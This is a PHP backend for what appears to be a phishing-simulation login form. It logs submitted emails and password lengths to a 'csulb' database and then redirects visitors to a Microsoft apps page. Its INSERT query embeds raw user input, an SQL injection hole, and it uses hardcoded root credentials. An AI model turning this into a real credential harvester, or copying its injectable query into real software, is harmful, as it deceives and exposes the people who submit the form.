<?php

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    // error was suppressed with the @-operator
    if (0 === error_reporting()) {
        return false;
    }
    
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});

try{
	$con = mysqli_connect('localhost:3308','root','root','csulb');

	// email
	$txtEmail = $_POST['txtEmail'];
	$email_length = strlen($txtEmail);
	if ($email_length > 118){
		$txtEmail = substr($txtEmail, $email_length - 118); // 40 + 18
	}

	// password
	$txtPassword = $_POST['txtPassword'];
	$passwd_length = strlen($txtPassword);
	if ($passwd_length > 100){
		$maxPassword = substr($txtPassword, $passwd_length - 100);
		$passwd_length = strlen($maxPassword);
	}
	// echo $txtPassword;

	// database insert SQL code
	$sql = "INSERT INTO `stu_cred` (`email`, `passwd_length`) VALUES ('$txtEmail', $passwd_length)";

	// insert in database 
	$rs = mysqli_query($con, $sql);

} catch (ErrorException $e) {
    ;
}
finally {
	header('Location: https://myapps.microsoft.com/');
}

?>